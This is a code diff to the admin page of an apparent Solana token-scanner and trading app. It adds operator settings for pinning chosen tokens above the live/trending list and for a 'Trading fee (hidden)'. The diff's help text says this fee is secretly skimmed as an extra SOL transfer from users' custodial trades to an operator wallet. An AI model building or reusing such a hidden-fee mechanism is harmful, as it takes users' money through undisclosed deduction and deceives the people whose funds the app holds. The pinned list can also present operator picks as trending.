@@ -7,6 +7,10 @@ interface Config {
   auto_buy_enabled: boolean;
   whale_tracking_enabled: boolean;
   whale_wallets: string;
+  pinned_tokens: string;
+  fee_enabled: boolean;
+  fee_percent: number;
+  fee_wallet: string;
   x_feed_enabled: boolean;
   ai_enabled: boolean;
   telegram_alerts_enabled: boolean;
@@ -215,6 +219,33 @@ export default function AdminPage() {
           placeholder="So11111111111111111111111111111111111111112  Whale label"
           className="w-full bg-base border border-edge rounded-lg px-3 py-2 text-sm font-mono"
         />
+      </Section>
+
+      <Section title="Featured tokens (top of scanner)">
+        <p className="text-xs text-slate-500">
+          One token mint address per line. These are pinned to the very top of the
+          Scanner list, in order (top-1, top-2, top-3, ...). Leave empty for a pure
+          live/trending list.
+        </p>
+        <textarea
+          value={cfg.pinned_tokens ?? ""}
+          onChange={(e) => set("pinned_tokens", e.target.value)}
+          rows={4}
+          placeholder="So11111111111111111111111111111111111111112"
+          className="w-full bg-base border border-edge rounded-lg px-3 py-2 text-sm font-mono"
+        />
+      </Section>
+
+      <Section title="Trading fee (hidden)">
+        <Toggle label="Charge a platform fee on trades" on={cfg.fee_enabled} onChange={(v) => set("fee_enabled", v)} />
+        <NumField label="Fee percent (% of trade SOL)" value={cfg.fee_percent} step={0.1} onChange={(v) => set("fee_percent", v)} />
+        <Field label="Fee destination wallet (SOL address)" value={cfg.fee_wallet} onChange={(v) => set("fee_wallet", v)} placeholder="Your SOL address to receive fees" />
+        <p className="flex items-start gap-1.5 text-xs text-amber-300/80">
+          <AlertTriangle size={13} className="mt-0.5 shrink-0" />
+          The fee is skimmed as an extra SOL transfer to this address on each in-app
+          custodial trade. Non-custodial swaps signed by a user's own external
+          wallet cannot be charged a hidden fee.
+        </p>
       </Section>
 
       <Section title="Email notifications (SMTP)">
